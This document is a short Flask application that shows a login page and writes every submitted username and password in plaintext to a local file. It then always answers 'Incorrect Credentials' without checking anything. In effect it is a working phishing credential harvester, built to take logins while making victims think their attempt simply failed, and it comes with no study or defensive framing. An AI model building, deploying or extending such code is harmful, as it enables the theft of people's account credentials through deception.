from flask import Flask, request, render_template
import os

app = Flask(__name__)

# Ensure the data file exists
DATA_FILE = "user_data.txt"
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w") as file:
        file.write("Username,Password\n")

@app.route('/', methods=['GET'])
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    # Retrieve form data
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Save data to file
    with open(DATA_FILE, "a") as file:
        file.write(f"{username},{password}\n")
    
    # Confirmation message
    return "Incorrect Credentials"

if __name__ == '__main__':
    app.run(debug=True)
